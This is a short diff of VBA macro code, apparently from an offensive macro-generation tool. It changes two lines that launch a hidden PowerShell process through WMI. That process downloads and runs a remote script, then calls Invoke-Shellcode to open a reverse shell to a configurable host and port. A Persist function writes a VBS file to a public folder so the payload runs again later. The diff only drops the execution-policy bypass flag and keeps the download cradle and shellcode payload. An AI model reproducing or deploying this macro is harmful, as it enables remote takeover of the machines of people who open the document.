@@ -99,7 +99,7 @@ End Sub
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
      
 Public Function Persist() As Variant
@@ -107,7 +107,7 @@ Public Function Persist() As Variant
     Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
-    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
+    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
     a.WriteLine ("objShell.Run command,0")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
